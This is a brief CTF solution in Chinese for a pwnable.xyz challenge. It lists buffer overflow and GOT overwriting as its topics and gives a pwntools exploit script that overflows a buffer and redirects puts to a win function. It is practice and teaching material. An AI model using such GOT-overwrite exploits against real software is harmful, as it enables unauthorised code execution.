### 知识点

- buffer溢出
- 代码阅读
- got覆盖



### 脚本

```python
from audioop import reverse
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30036)
# p = process('./challenge')

info('save progress')
p.sendafter(b'> ', b'5')
p.sendafter(b'Size: ', str.encode(str(1 << 31)).ljust(0x20, b'\x00'))

info('overflow a')
p.sendafter(b'> ', b'3')
p.sendlineafter(b'> ', b'3')
p.sendafter(b'> ', b'0')

for i in range(5):
    p.sendafter(b'> ', b'3')
    p.sendlineafter(b'> ', b'4')
    p.sendafter(b'> ', b'0')

info('overwrite got')
a_addr = 0x610da0
reserve_addr = 0x610ec0
puts_got = 0x610b10
win_addr = 0x4008e8

payload = b'a' * (a_addr + 256 - (reserve_addr & 0xffff00)) + p64(puts_got)
p.sendafter(b'> ', b'5')
p.send(payload)

p.sendafter(b'> ', b'5')
p.send(p64(win_addr))

# gdb.attach(p)
p.sendafter(b'> ', b'6')
p.interactive()

```

